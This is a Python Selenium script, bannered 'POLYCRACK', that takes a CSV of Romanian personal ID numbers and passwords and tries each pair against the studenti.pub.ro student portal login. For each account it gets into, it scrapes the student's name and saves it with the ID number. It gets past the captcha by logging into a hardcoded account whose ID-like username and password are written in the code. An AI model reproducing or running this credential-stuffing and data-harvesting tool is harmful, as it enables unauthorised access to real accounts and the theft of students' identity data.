import requests
import time
import csv
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("   ██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗")
print("   ██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝")
print("   ██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░")
print("   ██╔═══╝░██║░░██║██║░░░░░░░╚██╔╝░░██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░")
print("   ██║░░░░░╚█████╔╝███████╗░░░██║░░░╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗")
print("   ╚═╝░░░░░░╚════╝░╚══════╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝")

def write_to_csv(filename):
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file, delimiter=';')
            writer.writerow(['CNP', 'Nume'])
        print(f"Fișierul CSV '{filename}' a fost creat cu succes.")
        return 1
    except Exception as e:
        print(f"Eroare la scrierea în fișierul '{filename}':", e)
        return 0


def append_to_csv(filename, *data):
    try:
        with open(filename, 'a', newline='', encoding='utf-8') as file:
            writer = csv.writer(file, delimiter=';')
            writer.writerow(data)

    except Exception as e:
        print(f"Eroare la adăugarea în fișierul '{filename}':", e)

def append_to_txt(filename, *data):
    try:
        with open(filename, 'a', encoding='utf-8') as file:
            for item in data:
                file.write(str(item))
                file.write(';')  # Adaugi separatorul ';'
            file.write('\n')  # Adaugi un rând nou la sfârșitul fiecărei linii

    except Exception as e:
        print(f"Eroare la adăugarea în fișierul '{filename}': {e}")


def read_csv_file(filename, name):
    user = []
    password = []

    try:
        with open(filename, 'r', newline='', encoding='utf-8') as file:
            reader = csv.reader(file, delimiter=';')
            next(reader)

            for row in reader:
                if len(row) >= 2:
                    user.append(row[0].strip())
                    password.append(row[1].strip())
                else:
                    print(f"Linia {reader.line_num} din fișierul '{name}'.csv nu are suficiente coloane și va fi ignorată.")

        print("Fișierul " + name + ".csv a fost citit cu succes.")
        return user, password

    except FileNotFoundError:
        print(f"Eroare: Fișierul '{name}'.csv nu a fost găsit.")
        return None, None
    except Exception as e:
        print(f"Eroare la citirea fișierului '{name}'.csv:", e)
        return None, None

def read_txt_file(filename, name):
    users = []
    passwords = []

    try:
        with open(filename, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            
            for line_num, line in enumerate(lines, start=1):
                columns = line.strip().split(';')
                if len(columns) >= 2:
                    users.append(columns[0].strip())
                    passwords.append(columns[1].strip())
                else:
                    print(f"Linia {line_num} din fișierul '{name}.txt' nu are suficiente coloane și va fi ignorată.")

        print(f"Fișierul {name}.txt a fost citit cu succes.")
        return users, passwords

    except FileNotFoundError:
        print(f"Eroare: Fișierul '{name}.txt' nu a fost găsit.")
        return None, None
    except Exception as e:
        print(f"Eroare la citirea fișierului '{name}.txt': {e}")
        return None, None
    

def check_internet_connection(url):
    try:
        response = requests.get(url, verify=False)
        response.raise_for_status()
        print("Conexiune la internet: OK")
    except requests.exceptions.RequestException as e:
        print("Eroare de conexiune la internet:", e)

def open_browser(url):
    try:
        # Configurare selenium
        options = webdriver.ChromeOptions()
        #options.add_argument('headless')  # Rulare în modul fără interfață grafică
        driver = webdriver.Chrome(options=options)
        
        # Accesare site
        driver.get(url)
        return driver
    except Exception as e:
        print("Eroare la deschiderea browser-ului:", e)
        return None

def close_browser(driver):
    try:
        if driver:
            driver.quit()  # Închide browser-ul
            print("Browser-ul a fost închis.")
    except Exception as e:
        print("Eroare la închiderea browser-ului:", e)

def navigate_website_captcha(driver, username, password):
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_Username')))
        username_input = driver.find_element(By.ID,'ctl0_ctl12_Username')
        username_input.clear()
        username_input.send_keys(username)

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_Password')))
        password_input = driver.find_element(By.ID,'ctl0_ctl12_Password')
        password_input.clear()
        password_input.send_keys(password)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_LoginButton')))
        login_button = driver.find_element(By.ID,'ctl0_ctl12_LoginButton')
        login_button.click()
        
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'content')))
        driver.refresh()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_LBlogout')))
        if 'ctl0_ctl12_LBlogout' in driver.page_source:
            #print("OK")
            additional_button = driver.find_element(By.ID,'ctl0_ctl12_LBlogout')
            additional_button.click()
            
            return 0
        else:
            print("Skip")
            return 1
    except Exception as e:
        print("Eroare fatala:", e)
        return 1



def navigate_website(driver, username, password):
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_Username')))
        username_input = driver.find_element(By.ID,'ctl0_ctl12_Username')
        username_input.clear()
        username_input.send_keys(username)

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_Password')))
        password_input = driver.find_element(By.ID,'ctl0_ctl12_Password')
        password_input.clear()
        password_input.send_keys(password)
        
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_LoginButton')))
        login_button = driver.find_element(By.ID,'ctl0_ctl12_LoginButton')
        login_button.click()
        

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'content')))
        driver.refresh()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'content')))

        if 'ctl0_ctl12_LBlogout' in driver.page_source:
            #print("OK")
            page_source = driver.page_source
            soup = BeautifulSoup(page_source, 'html.parser')
            div_element = soup.find('div', class_='f14 b')
            span_elements = div_element.find_all('span')
            for span in span_elements:
                span.decompose()
            content = div_element.get_text(strip=True)
            print(username + " - " + content)
            #append_to_csv(out_filename, username, content)
            
            if (username in cnpOut) == 0:
                append_to_txt(outfile, username, content)
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'ctl0_ctl12_LBlogout')))
            additional_button = driver.find_element(By.ID,'ctl0_ctl12_LBlogout')
            additional_button.click()
        else:
            print(username + " - " + "negativ")
        return 0
    except Exception as e:
        print("Eroare la navigarea pe website:", e)
        return 1

if __name__ == "__main__":
    # Verificare conexiune la internet
    check_internet_connection("https://studenti.pub.ro/")
    SRNO = 0
    # Inputul celor două variabile
    #filename = input("Introduceți numele fișierului CSV (fără extensie): ") + ".csv"
    #filename = "502122746.csv"
    #filename = r'D:\DATA +\Misc 2\C++\workspace cod nautic pulosonal\502122746.csv'
    denumire = input("Introduceți numele fișierului CSV (fără extensie): ")
    outfiledata = "data"
    start = 1
    stop = 1000
    start = int(input("Start: "))
    stop = int(input("Stop: "))
    
    filename = os.path.join(os.path.dirname(__file__), denumire + '.csv')

    outfile = os.path.join(os.path.dirname(__file__), outfiledata + '.txt')
    cnpOut, nameOut = read_txt_file(outfile, outfiledata)

    #out_filename = "out_" + denumire + ".csv"
    out_filename = os.path.join(os.path.dirname(__file__), "out_" + denumire + '.csv')
    user, passw = read_csv_file(filename, denumire)
    

    if(stop > 1000):
        stop = 1000
    if(start > stop):
        start = stop-1

    driver = open_browser("https://studenti.pub.ro/")
    #if(write_to_csv(out_filename)):
    if driver:
        for i in range(start, stop+1):
            username = user[i]
            password = passw[i]
            if(navigate_website_captcha(driver, 5021227460022, 460022) == 0):
                if(navigate_website(driver, username, password)==1):
                    print("normal ALO!")
                    close_browser(driver)
                    driver = open_browser("https://studenti.pub.ro/")
            else:
                print("CAPTCHA ALO!")
                close_browser(driver)
                driver = open_browser("https://studenti.pub.ro/")
        close_browser(driver)
    exitvar = "y"
        
    while(exitvar != "x"):
        exitvar = input("Enter (x) to close: ")